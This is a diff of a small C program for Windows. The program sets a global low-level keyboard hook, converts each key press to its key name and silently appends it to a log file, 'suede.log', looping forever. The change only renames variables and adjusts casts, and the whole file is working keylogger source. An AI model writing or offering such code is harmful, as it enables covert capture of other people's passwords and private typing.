@@ -1,26 +1,25 @@
 #include <stdio.h>
 #include <windows.h>
-HHOOK hKeyHook;
+HHOOK hk;
 
-LRESULT KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
-  KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
+LRESULT KeyEvent(int hc, WPARAM id, KBDLLHOOKSTRUCT * kd) {
   DWORD mesg = 1;
-  switch (wParam) {
+  switch (id) {
     case WM_KEYDOWN:
     case WM_SYSKEYDOWN:
-      mesg += hooked->scanCode << 16;
-      mesg += hooked->flags << 24;
+      mesg += kd->scanCode << 16;
+      mesg += kd->flags << 24;
       char kn[] = "Windows Right";
       GetKeyNameText(mesg, kn, sizeof kn);
       FILE * fpt = fopen("suede.log", "a");
       fprintf(fpt, "_%s", kn);
       fflush(fpt);
   }
-  return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
+  return CallNextHookEx(hk, hc, id, (LPARAM) kd);
 }
 
 int main() {
-  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, 0, 0);
+  hk = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, 0, 0);
   while (1) {
     GetMessage(0, 0, 0, 0);
   }
